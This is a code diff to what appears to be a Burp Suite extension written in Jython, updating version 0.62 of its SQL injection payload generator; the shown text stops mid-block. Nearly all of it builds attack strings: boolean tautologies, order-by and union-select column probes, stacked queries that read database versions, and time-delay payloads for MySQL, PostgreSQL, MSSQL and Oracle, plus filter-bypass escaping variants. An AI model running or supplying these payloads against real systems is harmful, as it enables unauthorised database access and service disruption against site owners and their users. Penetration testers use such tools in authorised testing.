@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.61"
+VERSION = "0.62"
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
     
@@ -417,6 +417,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
         listSQLi = []
         prefixes = ["", "\\n", "\\r\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
+        prefixes = ["", "\\n"]
         
         escapeChars = ["", "'", "\\'", "\\\\'"]
 
@@ -435,205 +436,200 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 for escapeChar in escapeChars:
                     for boolExpression in boolExpressions:
                         for suffix in suffixes[1:]:
-                            if prefix[:2].count("\\") == escapeChar[:2].count("\\") or prefix.find('\\') or escapeChar.find('\\'): 
-                                listSQLi.append(prefix + escapeChar + " or " + boolExpression + suffix + "\n")
-                                if not escapeChar:
-                                    listSQLi.append(prefix + " or " + boolExpression + "\n")
+                            listSQLi.append(prefix + escapeChar + " or " + boolExpression + suffix + "\n")
+                            if not escapeChar:
+                                listSQLi.append(prefix + " or " + boolExpression + "\n")
             for prefix in prefixes:
                 for escapeChar in escapeChars[1:]:
                     for suffix in suffixes[1:]:
-                        if prefix[:2].count("\\") == escapeChar[:2].count("\\") or prefix.find('\\') or escapeChar.find('\\'): 
-                            listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + "\n")
-                            listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
-                            listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + "\n")
-                            listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
+                        listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + "\n")
+                        listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
+                        listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + "\n")
+                        listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
         
 
         if self._cbOrderBased.isSelected():
             for prefix in prefixes:
                 for escapeChar in escapeChars:
                     for suffix in suffixes[1:]:
-                        if prefix[:2].count("\\") == escapeChar[:2].count("\\") or prefix.find('\\') or escapeChar.find('\\'): 
-                            for i in range(int(self._cbOrderDepth.getSelectedItem())):
-                                listSQLi.append(prefix + escapeChar + " order by " + str(i+1) + suffix + "\n")
-                                if not escapeChar:
-                                    listSQLi.append(prefix + escapeChar + " order by " + str(i+1) + "\n")
+                        for i in range(int(self._cbOrderDepth.getSelectedItem())):
+                            listSQLi.append(prefix + escapeChar + " order by " + str(i+1) + suffix + "\n")
+                            if not escapeChar:
+                                listSQLi.append(prefix + escapeChar + " order by " + str(i+1) + "\n")
 
         if self._cbUnionBased.isSelected():
             for prefix in prefixes:
                 for escapeChar in escapeChars:
                     for suffix in suffixes[1:]:
-                        if prefix[:2].count("\\") == escapeChar[:2].count("\\") or prefix.find('\\') or escapeChar.find('\\'): 
-                            unionPhrase = " union select "
-                            for i in range(int(self._cbUnionDepth.getSelectedItem())):
-                                unionPhrase += "null"                                
-                                if self._cbMysqlBased.isSelected():
-                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
+                        unionPhrase = " union select "
+                        for i in range(int(self._cbUnionDepth.getSelectedItem())):
+                            unionPhrase += "null"                                
+                            if self._cbMysqlBased.isSelected():
+                                listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
+                                if not escapeChar:
+                                    listSQLi.append(prefix + unionPhrase + "\n")
+                                if self._cbTimeBased.isSelected():
+                                    listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select sleep(1000)") + suffix + "\n")
                                     if not escapeChar:
-                                        listSQLi.append(prefix + unionPhrase + "\n")
-                                    if self._cbTimeBased.isSelected():
-                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select sleep(1000)") + suffix + "\n")
-                                        if not escapeChar:
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select sleep(1000)") + "\n")
-                                if self._cbPostgreBased.isSelected():
-                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
+                                        listSQLi.append(prefix + unionPhrase.replace("select null", "select sleep(1000)") + "\n")
+                            if self._cbPostgreBased.isSelected():
+                                listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
+                                if not escapeChar:
+                                    listSQLi.append(prefix + unionPhrase + "\n")
+                                if self._cbTimeBased.isSelected():
+                                    listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(1000))") + suffix + "\n")
                                     if not escapeChar:
-                                        listSQLi.append(prefix + unionPhrase + "\n")
-                                    if self._cbTimeBased.isSelected():
-                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(1000))") + suffix + "\n")
-                                        if not escapeChar:
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(1000))") + "\n")
-                                if self._cbMssqlBased.isSelected():
-                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
-                                    if not escapeChar:
-                                        listSQLi.append(prefix + unionPhrase + "\n")
-                                    if self._cbTimeBased.isSelected():
-                                        if escapeChar:
-                                            listSQLi.append(prefix + escapeChar + unionPhrase + " waitfor delay " + escapeChar + "00:20" + escapeChar + suffix + "\n")
-                                        else:
-                                            listSQLi.append(prefix + unionPhrase + " waitfor delay '00:20'" + "\n")
-                                            if self._cbSqlWafBypass.isSelected():
-                                                listSQLi.append(prefix + unionPhrase + " waitfor delay \\'00:20\\'" + "\n")
-                                                listSQLi.append(prefix + unionPhrase + " waitfor delay \\\\'00:20\\\\'" + "\n")
-                                if self._cbOracleBased.isSelected():
-                                    listSQLi.append(prefix + escapeChar + unionPhrase + " from dual" + suffix + "\n")
-                                    if not escapeChar:
-                                        listSQLi.append(prefix + unionPhrase + " from dual" + "\n")
-                                    if self._cbTimeBased.isSelected():
-                                        if escapeChar:
-                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)") + " from dual" + suffix + "\n")                                            
-                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(1,1000)") + " from dual" + suffix + "\n")
-                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000) as varchar2(10))") + " from dual" + suffix + "\n")
-                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(1,1000) as varchar2(10))") + " from dual" + suffix + "\n")
-                                        else:
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(('a'),1000)") + " from dual" + suffix + "\n")
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(('a'),1000)") + " from dual" + "\n")
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(1,1000)") + " from dual" + suffix + "\n")
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(1,1000)") + " from dual" + "\n")
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(('a'),1000) as varchar2(10))") + " from dual" + suffix + "\n")
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(('a'),1000) as varchar2(10))") + " from dual" + "\n")
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(1,1000) as varchar2(10))") + " from dual" + suffix + "\n")
-                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(1,1000) as varchar2(10))") + " from dual" + "\n")
-                                            if self._cbSqlWafBypass.isSelected():
-                                                listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message((\\'a\\'),1000)") + " from dual" + suffix + "\n")
-                                                listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message((\\'a\\'),1000)") + " from dual" + "\n")
-                                                listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),1000) as varchar2(10))") + " from dual" + suffix + "\n")
-                                                listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),1000) as varchar2(10))") + " from dual" + "\n")
-                                                listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message((\\\\'a\\\\'),1000)") + " from dual" + suffix + "\n")
-                                                listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message((\\\\'a\\\\'),1000)") + " from dual" + "\n")
-                                                listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message((\\\\'a\\\\'),1000) as varchar2(10))") + " from dual" + suffix + "\n")
-                                                listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message((\\\\'a\\\\'),1000) as varchar2(10))") + " from dual" + "\n")
-                                unionPhrase += ","
+                                        listSQLi.append(prefix + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(1000))") + "\n")
+                            if self._cbMssqlBased.isSelected():
+                                listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
+                                if not escapeChar:
+                                    listSQLi.append(prefix + unionPhrase + "\n")
+                                if self._cbTimeBased.isSelected():
+                                    if escapeChar:
+                                        listSQLi.append(prefix + escapeChar + unionPhrase + " waitfor delay " + escapeChar + "00:20" + escapeChar + suffix + "\n")
+                                    else:
+                                        listSQLi.append(prefix + unionPhrase + " waitfor delay '00:20'" + "\n")
+                                        if self._cbSqlWafBypass.isSelected():
+                                            listSQLi.append(prefix + unionPhrase + " waitfor delay \\'00:20\\'" + "\n")
+                                            listSQLi.append(prefix + unionPhrase + " waitfor delay \\\\'00:20\\\\'" + "\n")
+                            if self._cbOracleBased.isSelected():
+                                listSQLi.append(prefix + escapeChar + unionPhrase + " from dual" + suffix + "\n")
+                                if not escapeChar:
+                                    listSQLi.append(prefix + unionPhrase + " from dual" + "\n")
+                                if self._cbTimeBased.isSelected():
+                                    if escapeChar:
+                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)") + " from dual" + suffix + "\n")                                            
+                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(1,1000)") + " from dual" + suffix + "\n")
+                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000) as varchar2(10))") + " from dual" + suffix + "\n")
+                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(1,1000) as varchar2(10))") + " from dual" + suffix + "\n")
+                                    else:
+                                        listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(('a'),1000)") + " from dual" + suffix + "\n")
+                                        listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(('a'),1000)") + " from dual" + "\n")
+                                        listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(1,1000)") + " from dual" + suffix + "\n")
+                                        listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message(1,1000)") + " from dual" + "\n")
+                                        listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(('a'),1000) as varchar2(10))") + " from dual" + suffix + "\n")
+                                        listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(('a'),1000) as varchar2(10))") + " from dual" + "\n")
+                                        listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(1,1000) as varchar2(10))") + " from dual" + suffix + "\n")
+                                        listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message(1,1000) as varchar2(10))") + " from dual" + "\n")
+                                        if self._cbSqlWafBypass.isSelected():
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message((\\'a\\'),1000)") + " from dual" + suffix + "\n")
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message((\\'a\\'),1000)") + " from dual" + "\n")
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),1000) as varchar2(10))") + " from dual" + suffix + "\n")
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),1000) as varchar2(10))") + " from dual" + "\n")
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message((\\\\'a\\\\'),1000)") + " from dual" + suffix + "\n")
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "dbms_pipe.receive_message((\\\\'a\\\\'),1000)") + " from dual" + "\n")
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message((\\\\'a\\\\'),1000) as varchar2(10))") + " from dual" + suffix + "\n")
+                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select "+ "cast(dbms_pipe.receive_message((\\\\'a\\\\'),1000) as varchar2(10))") + " from dual" + "\n")
+                            unionPhrase += ","
 
         for prefix in prefixes:
             for escapeChar in escapeChars:
                 for suffix in suffixes[1:]:
-                    if prefix[:2].count("\\") == escapeChar[:2].count("\\") or prefix.find('\\') or escapeChar.find('\\'): 
-                        if self._cbOracleBased.isSelected():
-                            if self._cbStackedSQL.isSelected():
-                                if escapeChar:
-                                    listSQLi.append(prefix + escapeChar + ";select banner from v$version" + suffix + "\n")
-                                    listSQLi.append(prefix + escapeChar + ";select version from v$instance" + suffix + "\n")
-                                else:
-                                    listSQLi.append(prefix + ";select banner from v$version" + "\n")
-                                    listSQLi.append(prefix + ";select version from v$instance" + "\n")
-                                    listSQLi.append(prefix + ";select banner from v$version" + suffix + "\n")
-                                    listSQLi.append(prefix + ";select version from v$instance" + suffix + "\n")
-                            if self._cbTimeBased.isSelected():
-                                if escapeChar:
-                                    listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000) else null end from dual " + suffix + "\n")
-                                    listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + "\n")
-                                    listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + "\n")
-                                    listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message(1,1000) else null end from dual " + suffix + "\n")
-                                    listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message(1,1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,1000)" + "\n")
-                                    listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message(1,1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,1000)" + "\n")
-                                else:
-                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),1000) else null end from dual" + suffix + "\n")
-                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),1000) else null end from dual" + "\n")
-                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,1000) else null end from dual" + suffix + "\n")
-                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,1000) else null end from dual" + "\n")
-                                    if self._cbSqlWafBypass.isSelected():
-                                        listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),1000) else null end from dual" + suffix + "\n")
-                                        listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),1000) else null end from dual" + "\n")
-                                        listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,1000) else null end from dual" + suffix + "\n")
-                                        listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,1000) else null end from dual" + "\n")
-                                        listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\\\'a\\\\'||dbms_pipe.receive_message((\\\\'a\\\\'),1000) else null end from dual" + suffix + "\n")
-                                        listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\\\'a\\\\'||dbms_pipe.receive_message((\\\\'a\\\\'),1000) else null end from dual" + "\n")
-                                        listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\\\'a\\\\'||dbms_pipe.receive_message(1,1000) else null end from dual" + suffix + "\n")
-                                        listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\\\'a\\\\'||dbms_pipe.receive_message(1,1000) else null end from dual" + "\n")
-                        if self._cbMysqlBased.isSelected():
-                            if self._cbStackedSQL.isSelected():
-                                listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
-                                if not escapeChar:
-                                    listSQLi.append(prefix + ";select @@version" + "\n")
-                            if self._cbTimeBased.isSelected():
-                                if escapeChar:
-                                    listSQLi.append(prefix + escapeChar + ";select sleep(1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + escapeChar + " and sleep(1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + escapeChar + " or sleep(1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from (select sleep(1000))A)" + suffix + "\n")
-                                    listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from (select sleep(1000))A)" + suffix + "\n")
-                                else:
-                                    listSQLi.append(prefix + " and sleep(1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + " and sleep(1000)" + "\n")
-                                    listSQLi.append(prefix + " or sleep(1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + " or sleep(1000)" + "\n")
-                                    listSQLi.append(prefix + ";select sleep(1000)" + "\n")
-                                    listSQLi.append(prefix + ";select sleep(1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(1000))A)" + suffix + "\n")
-                                    listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(1000))A)" + "\n")
-                                    listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(1000))A)" + suffix + "\n")
-                                    listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(1000))A)" + "\n")
-                                    listSQLi.append(prefix + "sleep(1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + "sleep(1000)" + "\n")
-                        if self._cbPostgreBased.isSelected():
-                            if self._cbStackedSQL.isSelected():
-                                listSQLi.append(prefix + escapeChar + ";select version()" + suffix + "\n")
-                                if not escapeChar:
-                                    listSQLi.append(prefix + ";select version()" + "\n")
-                            if self._cbTimeBased.isSelected():
-                                if escapeChar:
-                                    listSQLi.append(prefix + escapeChar + ";select pg_sleep(1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from pg_sleep(1000))" + suffix + "\n")                                    
-                                    listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from pg_sleep(1000))" + suffix + "\n")
-                                else:
-                                    listSQLi.append(prefix + ";select pg_sleep(1000)" + suffix + "\n")
-                                    listSQLi.append(prefix + ";select pg_sleep(1000)" + "\n")
-                                    listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(1000))" + suffix + "\n")
-                                    listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(1000))" + "\n")
-                                    listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(1000))" + suffix + "\n")
-                                    listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(1000))" + "\n")
-                        if self._cbMssqlBased.isSelected():
-                            if self._cbStackedSQL.isSelected():
-                                listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
-                                if not escapeChar:
-                                    listSQLi.append(prefix + escapeChar + ";select @@version" + "\n")
-                            if self._cbTimeBased.isSelected():
-                                if escapeChar:
-                                    listSQLi.append(prefix + escapeChar + " waitfor delay " + escapeChar + "00:20" + escapeChar + suffix + "\n")
-                                    listSQLi.append(prefix + escapeChar + ";waitfor delay " + escapeChar + "00:20" + escapeChar + suffix + "\n")
-                                else:
-                                    listSQLi.append(prefix + " waitfor delay '00:20'" + suffix + "\n")
-                                    listSQLi.append(prefix + " waitfor delay '00:20'" + "\n")
-                                    listSQLi.append(prefix + ";waitfor delay '00:20'" + suffix + "\n")
-                                    listSQLi.append(prefix + ";waitfor delay '00:20'" + "\n")
-                                    if self._cbSqlWafBypass.isSelected():
-                                        listSQLi.append(prefix + " waitfor delay \\'00:20\\'" + suffix + "\n")
-                                        listSQLi.append(prefix + " waitfor delay \\'00:20\\'" + "\n")
-                                        listSQLi.append(prefix + ";waitfor delay \\'00:20\\'" + suffix + "\n")
-                                        listSQLi.append(prefix + ";waitfor delay \\'00:20\\'" + "\n")
-                                        listSQLi.append(prefix + " waitfor delay \\\\'00:20\\\\'" + suffix + "\n")
-                                        listSQLi.append(prefix + " waitfor delay \\\\'00:20\\\\'" + "\n")
-                                        listSQLi.append(prefix + ";waitfor delay \\\\'00:20\\\\'" + suffix + "\n")
-                                        listSQLi.append(prefix + ";waitfor delay \\\\'00:20\\\\'" + "\n")
+                    if self._cbOracleBased.isSelected():
+                        if self._cbStackedSQL.isSelected():
+                            if escapeChar:
+                                listSQLi.append(prefix + escapeChar + ";select banner from v$version" + suffix + "\n")
+                                listSQLi.append(prefix + escapeChar + ";select version from v$instance" + suffix + "\n")
+                            else:
+                                listSQLi.append(prefix + ";select banner from v$version" + "\n")
+                                listSQLi.append(prefix + ";select version from v$instance" + "\n")
+                                listSQLi.append(prefix + ";select banner from v$version" + suffix + "\n")
+                                listSQLi.append(prefix + ";select version from v$instance" + suffix + "\n")
+                        if self._cbTimeBased.isSelected():
+                            if escapeChar:
+                                listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000) else null end from dual " + suffix + "\n")
+                                listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
+                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
+                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + "\n")
+                                listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
+                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + suffix + "\n")
+                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),1000)" + "\n")
+                                listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message(1,1000) else null end from dual " + suffix + "\n")
+                                listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message(1,1000)" + suffix + "\n")
+                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,1000)" + suffix + "\n")
+                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,1000)" + "\n")
+                                listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message(1,1000)" + suffix + "\n")
+                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,1000)" + suffix + "\n")
+                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,1000)" + "\n")
+                            else:
+                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),1000) else null end from dual" + suffix + "\n")
+                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),1000) else null end from dual" + "\n")
+                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,1000) else null end from dual" + suffix + "\n")
+                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,1000) else null end from dual" + "\n")
+                                if self._cbSqlWafBypass.isSelected():
+                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),1000) else null end from dual" + suffix + "\n")
+                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),1000) else null end from dual" + "\n")
+                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,1000) else null end from dual" + suffix + "\n")
+                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,1000) else null end from dual" + "\n")
+                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\\\'a\\\\'||dbms_pipe.receive_message((\\\\'a\\\\'),1000) else null end from dual" + suffix + "\n")
+                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\\\'a\\\\'||dbms_pipe.receive_message((\\\\'a\\\\'),1000) else null end from dual" + "\n")
+                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\\\'a\\\\'||dbms_pipe.receive_message(1,1000) else null end from dual" + suffix + "\n")
+                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\\\'a\\\\'||dbms_pipe.receive_message(1,1000) else null end from dual" + "\n")
+                    if self._cbMysqlBased.isSelected():
+                        if self._cbStackedSQL.isSelected():
+                            listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
+                            if not escapeChar:
+                                listSQLi.append(prefix + ";select @@version" + "\n")
+                        if self._cbTimeBased.isSelected():
+                            if escapeChar:
+                                listSQLi.append(prefix + escapeChar + ";select sleep(1000)" + suffix + "\n")
+                                listSQLi.append(prefix + escapeChar + " and sleep(1000)" + suffix + "\n")
+                                listSQLi.append(prefix + escapeChar + " or sleep(1000)" + suffix + "\n")
+                                listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from (select sleep(1000))A)" + suffix + "\n")
+                                listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from (select sleep(1000))A)" + suffix + "\n")
+                            else:
+                                listSQLi.append(prefix + " and sleep(1000)" + suffix + "\n")
+                                listSQLi.append(prefix + " and sleep(1000)" + "\n")
+                                listSQLi.append(prefix + " or sleep(1000)" + suffix + "\n")
+                                listSQLi.append(prefix + " or sleep(1000)" + "\n")
+                                listSQLi.append(prefix + ";select sleep(1000)" + "\n")
+                                listSQLi.append(prefix + ";select sleep(1000)" + suffix + "\n")
+                                listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(1000))A)" + suffix + "\n")
+                                listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(1000))A)" + "\n")
+                                listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(1000))A)" + suffix + "\n")
+                                listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(1000))A)" + "\n")
+                                listSQLi.append(prefix + "sleep(1000)" + suffix + "\n")
+                                listSQLi.append(prefix + "sleep(1000)" + "\n")
+                    if self._cbPostgreBased.isSelected():
+                        if self._cbStackedSQL.isSelected():
+                            listSQLi.append(prefix + escapeChar + ";select version()" + suffix + "\n")
+                            if not escapeChar:
+                                listSQLi.append(prefix + ";select version()" + "\n")
+                        if self._cbTimeBased.isSelected():
+                            if escapeChar:
